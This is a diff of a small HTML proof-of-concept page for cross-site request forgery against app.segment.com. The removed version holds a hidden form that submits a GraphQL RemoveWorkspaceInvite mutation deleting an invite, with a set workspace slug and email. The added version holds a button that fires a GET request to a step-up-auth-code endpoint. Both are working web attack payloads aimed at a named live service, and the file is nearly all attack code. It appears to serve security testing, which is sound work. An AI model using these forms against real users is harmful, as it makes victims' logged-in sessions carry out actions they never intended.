@@ -1,25 +1,15 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>CSRF PoC – RemoveWorkspaceInvite (multipart/form-data)</title>
+  <meta charset="UTF-8">
+  <title>CSRF PoC - GET step-up-auth-code/request</title>
 </head>
 <body>
-  <h2>CSRF PoC – Remove Workspace Invite (multipart/form-data)</h2>
+  <h2>CSRF PoC — Manual Trigger</h2>
+  <p>Click the button below to send the GET request while logged in to <strong>app.segment.com</strong>.</p>
 
-  <form action="https://app.segment.com/gateway-api/graphql?operation=RemoveWorkspaceInvite"
-        method="POST" enctype="multipart/form-data" target="_blank">
-
-    <input type="hidden" name="operationName" value="RemoveWorkspaceInvite">
-
-    <input type="hidden" name="variables"
-      value='{"input":{"workspaceSlug":"admin-test-1a07","email":"admin@segment.com"}}'>
-
-    <input type="hidden" name="query"
-      value='mutation RemoveWorkspaceInvite($input: DeleteInviteInput!) { deleteInvite(input: $input) { deleted __typename } }'>
-
-    <button type="submit">Submit CSRF Request</button>
+  <form action="https://app.segment.com/gateway-api/rest/step-up-auth-code/request" method="GET" target="_blank">
+    <button type="submit">Send CSRF GET Request</button>
   </form>
-
 </body>
 </html>
